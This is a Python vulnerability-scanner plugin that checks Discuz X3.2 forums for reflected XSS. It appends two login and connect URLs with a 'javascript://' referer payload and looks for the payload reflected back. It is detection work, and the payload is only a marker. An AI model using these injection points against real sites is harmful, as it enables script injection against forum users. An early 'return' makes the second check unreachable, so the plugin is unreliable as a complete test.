# !/usr/bin/dev python
# -*- coding:utf-8 -*-
#_Author_= dannis
#_PlugName_ = Disucz X3.2 多处反射型XSS漏洞
#_FileName_ = disuczX32recv.py

import re
import time
import math

def assign(service, arg):
    if service == "disucz":
        return True, arg

def audit(args):
    payload0 = "member.php?mod=logging&action=login&referer=javascript://www.discuz.net/testvul"
    payload1 = "connect.php?receive=yes&mod=login&op=callback&referer=javascript://www.discuz.net/testvul"
    verify_url = args + payload0
    code, head,res, errcode, _ = curl.curl(verify_url)
    if code == 200 and "javascript://www.discuz.net/testvul" in res:
        security_info(verify_url) 
    return
        
    verify_url = args + payload1
    code, head,res, errcode, _ = curl.curl(verify_url)
    if code == 200 and "javascript://www.discuz.net/testvul" in res:
        security_info(verify_url)    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('disucz', 'http://www.example.com/')[1])